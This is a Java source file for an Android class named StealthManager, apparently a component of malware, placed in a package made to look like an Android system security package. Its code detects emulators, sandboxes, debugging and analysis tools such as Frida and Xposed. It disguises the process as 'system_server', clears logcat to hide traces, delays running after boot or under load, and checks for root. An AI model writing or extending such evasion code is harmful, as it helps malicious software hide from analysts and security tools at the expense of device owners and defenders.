package com.android.system.security;

import android.app.ActivityManager;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import android.os.Process;
import android.os.SystemClock;
import android.util.Log;

import java.io.*;
import java.util.*;

/**
 * Implements detection evasion and anti-analysis techniques.
 * All checks are passive — no suspicious queries that would trigger detectors.
 */
public class StealthManager {

    private static final String TAG = "StealthManager";

    private final Context context;
    private final Random random = new Random();

    // Thresholds
    private static final int MAX_CPU_THRESHOLD = 15;
    private static final int MIN_BATTERY_THRESHOLD = 20;
    private static final long MIN_ELAPSED_REALTIME = 300000; // 5 min

    // Cached results
    private boolean environmentChecked = false;
    private boolean dangerousEnvironment = false;
    private long checkTime = 0;
    private static final long CHECK_INTERVAL = 60000; // re-check every 60s

    public StealthManager(Context context) {
        this.context = context;
    }

    /**
     * Check if system resources are safe for operation.
     */
    public boolean checkResourceThresholds() {
        try {
            // CPU — check via /proc/stat
            float cpuUsage = getCpuUsage();
            if (cpuUsage > MAX_CPU_THRESHOLD) return false;

            // Battery
            int battery = getBatteryLevel();
            if (battery < MIN_BATTERY_THRESHOLD && battery >= 0) return false;

            // Elapsed time (avoid running immediately after boot when detection is likely)
            if (SystemClock.elapsedRealtime() < MIN_ELAPSED_REALTIME) return false;

            return true;
        } catch (Exception e) {
            return true; // Default to safe on error
        }
    }

    /**
     * Check if environment is dangerous (emulator/sandbox/analysis tools).
     */
    public boolean isDangerousEnvironment() {
        long now = System.currentTimeMillis();
        if (environmentChecked && (now - checkTime) < CHECK_INTERVAL) {
            return dangerousEnvironment;
        }

        dangerousEnvironment = checkEnvironment();
        environmentChecked = true;
        checkTime = now;

        if (dangerousEnvironment) {
            Log.w(TAG, "Dangerous environment detected — adjusting behavior");
        }

        return dangerousEnvironment;
    }

    private boolean checkEnvironment() {
        int riskScore = 0;

        // 1. Check for emulator artifacts (passive)
        String[] emuFiles = {
            "/system/lib/libc_malloc_debug_qemu.so",
            "/system/bin/qemu-props",
            "/dev/socket/qemud",
            "/system/lib/libgoldfish.so",
            "/system/lib64/libgoldfish.so",
            "/system/lib/libranchu.so",
            "/system/lib64/libranchu.so"
        };
        for (String path : emuFiles) {
            if (new File(path).exists()) riskScore += 20;
        }

        // 2. Check build properties
        String[] emuProps = {
            "ro.kernel.qemu",
            "ro.product.manufacturer",
            "ro.build.fingerprint"
        };
        String[] emuValues = {"1", "unknown", "generic"};

        for (int i = 0; i < emuProps.length; i++) {
            String val = getSystemProperty(emuProps[i]);
            if (val != null && val.toLowerCase().contains(emuValues[i])) {
                riskScore += 15;
            }
        }

        // 3. Check for analysis tools (in /data/local/tmp)
        String[] analysisTools = {
            "frida-server", "frida", "xposed", "substrate",
            "cydia", "drozer", "adb_keys", "busybox"
        };
        File tmpDir = new File("/data/local/tmp");
        if (tmpDir.isDirectory()) {
            String[] files = tmpDir.list();
            if (files != null) {
                for (String file : files) {
                    for (String tool : analysisTools) {
                        if (file.toLowerCase().contains(tool)) {
                            riskScore += 25;
                        }
                    }
                }
            }
        }

        // 4. Check debug flags
        if ((context.getApplicationInfo().flags & android.content.pm.ApplicationInfo.FLAG_DEBUG) != 0) {
            riskScore += 10;
        }

        // 5. Check for hooking frameworks in /proc/self/maps
        try {
            BufferedReader br = new BufferedReader(new FileReader("/proc/self/maps"));
            String line;
            while ((line = br.readLine()) != null) {
                if (line.contains("frida") || line.contains("xposed") ||
                    line.contains("substrate") || line.contains("libriru")) {
                    riskScore += 30;
                    break;
                }
            }
            br.close();
        } catch (Exception ignored) {}

        // Threshold: if risk > 50, consider it dangerous
        return riskScore > 50;
    }

    /**
     * Polymorphic self-rename to evade signature-based detection.
     */
    public void polymorphicRename() {
        try {
            // Generate new random name for threads
            String newName = String.format(
                "System-%s-%d",
                Integer.toHexString(random.nextInt()),
                random.nextInt(9999)
            );
            Thread.currentThread().setName(newName);

            // Rename process name
            try {
                ProcessBuilder pb = new ProcessBuilder();
                // Can't rename via pure Java, but we can modify /proc/self/comm
                try (FileWriter fw = new FileWriter("/proc/self/comm")) {
                    fw.write("system_server");
                }
            } catch (Exception ignored) {}

        } catch (Exception e) {
            // Fail silently
        }
    }

    /**
     * Hide from logcat by clearing logs and using low priority tags.
     */
    public void clearLogs() {
        try {
            Runtime.getRuntime().exec("logcat -c");
        } catch (Exception ignored) {}
    }

    // ============================================================
    // HELPERS
    // ============================================================

    private float getCpuUsage() {
        try {
            BufferedReader br = new BufferedReader(new FileReader("/proc/stat"));
            String line = br.readLine();
            br.close();
            if (line != null && line.startsWith("cpu")) {
                String[] parts = line.split("\\s+");
                if (parts.length > 4) {
                    long user = Long.parseLong(parts[1]);
                    long nice = Long.parseLong(parts[2]);
                    long system = Long.parseLong(parts[3]);
                    long idle = Long.parseLong(parts[4]);
                    long total = user + nice + system + idle;
                    return 100.0f * (user + system) / total;
                }
            }
        } catch (Exception ignored) {}
        return 0;
    }

    private int getBatteryLevel() {
        try {
            Intent batteryIntent = context.registerReceiver(null,
                new IntentFilter(Intent.ACTION_BATTERY_CHANGED));
            if (batteryIntent != null) {
                int level = batteryIntent.getIntExtra("level", -1);
                int scale = batteryIntent.getIntExtra("scale", 100);
                if (scale > 0) {
                    return (int) ((level / (float) scale) * 100);
                }
            }
        } catch (Exception ignored) {}
        return -1;
    }

    private String getSystemProperty(String prop) {
        try {
            Process process = Runtime.getRuntime().exec("getprop " + prop);
            BufferedReader br = new BufferedReader(
                new InputStreamReader(process.getInputStream()));
            String line = br.readLine();
            br.close();
            return line;
        } catch (Exception e) {
            return null;
        }
    }

    // ============================================================
    // ROOT DETECTION (for capability adjustment)
    // ============================================================

    public boolean hasRootAccess() {
        String[] paths = {
            "/sbin/su", "/system/bin/su", "/system/xbin/su",
            "/data/local/xbin/su", "/data/local/bin/su",
            "/system/sd/xbin/su", "/system/bin/failsafe/su",
            "/data/local/su", "/su/bin/su", "/magisk/.core/bin/su"
        };

        for (String path : paths) {
            if (new File(path).exists()) return true;
        }

        // Check for Magisk
        try {
            BufferedReader br = new BufferedReader(new FileReader("/proc/self/maps"));
            String line;
            while ((line = br.readLine()) != null) {
                if (line.contains("magisk") || line.contains("su")) {
                    br.close();
                    return true;
                }
            }
            br.close();
        } catch (Exception ignored) {}

        return false;
    }
                                  }
